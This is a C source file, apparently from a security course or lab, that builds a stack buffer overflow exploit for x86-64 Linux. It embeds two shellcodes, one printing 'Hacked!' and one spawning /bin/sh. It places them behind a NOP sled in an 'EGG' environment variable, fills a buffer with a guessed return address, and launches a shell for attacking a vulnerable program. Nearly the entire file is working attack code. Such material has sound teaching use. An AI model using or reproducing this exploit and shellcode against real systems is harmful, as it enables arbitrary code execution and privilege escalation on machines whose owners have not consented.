#include <stdlib.h>
#include <string.h>

#define DEFAULT_OFFSET 0
#define DEFAULT_BUFFER_SIZE 512
#define DEFAULT_EGG_SIZE 2048
#define NOP 0x90

const char hacked_shellcode[] = "\xeb\x1a"	// jmp    40009c <_start+0x1c>
	"\x48\x31\xc0"							// xor    %rax,%rax
	"\xb0\x01"								// mov    $0x1,%al
	"\x48\x31\xff"							// xor    %rdi,%rdi
	"\x40\xb7\x01"							// mov    $0x1,%dil
	"\x5e"									// pop    %rsi
	"\x48\x31\xd2"							// xor    %rdx,%rdx
	"\xb2\x07"								// mov    $0x07,%dl
	"\x0f\x05"								// syscall 
	"\x48\x31\xc0"							// xor    %rax,%rax
	"\xb0\x3c"								// mov    $0x3c,%al
	"\x0f\x05"								// syscall 
	"\xe8\xe1\xff\xff\xff"					// callq  400082 <_start+0x2>
	"Hacked!";

// shellcode from http://shell-storm.org/shellcode/files/shellcode-106.php

const char short_shellcode[] = "\x48\x31\xc0"    // xor    %rax,%rax
    "\x99"                                       // cltd
    "\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68"   // mov $0x68732f6e69622fff,%rdi
    "\xb0\x3b"                                   // mov    $0x3b,%al
    "\x48\xc1\xef\x08"                           // shr    $0x8,%rdi
    "\x57"                                       // push   %rdi
    "\x48\x89\xe7"                               // mov    %rsp,%rdi
    "\x57"                                       // push   %rdi
    "\x52"                                       // push   %rdx
    "\x48\x89\xe6"                               // mov    %rsp,%rsi
    "\x0f\x05";                                  // syscall

unsigned long get_sp(void) {
	__asm__("mov %rsp, %rax");
}

int main(int argc, char *argv[]) {
	/**
	buffer (in the vulnerable program) is 80 bytes,
	so the stack looks like this
	---------------------------------------------------------------------------
	|argv -   | argc -  | Buffer -   | int i - | Slack -  | RBP -   | RET -   |
	|12 bytes | 4 bytes | 80 bytes   | 4 bytes | 12 bytes | 8 bytes | 8 bytes |
	---------------------------------------------------------------------------
	We will replace the contents of the stack from buffer 
	and overwrite the return address so that it points to 
	the address of buffer.
	---------------------------------------------------
	| NOP -   | Shellcode - | NOP -   | PTR to egg    |
	| X bytes | Y bytes     | Z bytes | env - 8 bytes |
	---------------------------------------------------
	X + Y + Z = 104 bytes
	Buff size = 116
	**/
	char *shellcode;
	long addr, sp;
	int offset = DEFAULT_OFFSET, bsize = DEFAULT_BUFFER_SIZE;
	int i, eggsize = DEFAULT_EGG_SIZE, choice = 1;
	if (argc > 1)
		bsize = atoi(argv[1]);
	if (argc > 2)
		offset = atoi(argv[2]);
	if (argc > 3)
		eggsize = atoi(argv[3]);
	if (argc > 4)
		choice = atoi(argv[4]);
	printf("Buffer size: %d, Offset: %d, Choice: %d\n", bsize, offset, choice);
	switch (choice) {
		case 1: 
			shellcode = malloc(sizeof(hacked_shellcode));
			shellcode = hacked_shellcode;
			break;
		default:
			shellcode = malloc(sizeof(short_shellcode));
			shellcode = short_shellcode;
	}
	char buff[bsize], egg[eggsize], *ptr;
	sp = get_sp();
	printf("Stack pointer: 0x%x\n", sp);
	addr = sp - offset; 
	printf("Using address: 0x%x\n", addr);
	ptr = buff;
	long *addr_ptr = (long int *) ptr;
	// The limit is bsize/8 because addresses are eightbyte aligned on
	// 64 bit processors.
	for (i = 0; i < bsize/8; i++)
		*(addr_ptr + i) = (long int) addr;
	memcpy(buff, "RET=", 4);
	memset(egg, NOP, sizeof(egg));
	memset(egg, NOP, sizeof(egg));
	memcpy(egg, "EGG=", 4);
	memcpy(egg + eggsize - 1 - strlen(shellcode), shellcode, strlen(shellcode));
	buff[bsize-1] = '\0';
	egg[eggsize-1] = '\0';
	putenv(egg);
	putenv(buff);
	system("/bin/sh");
	return 0;
}
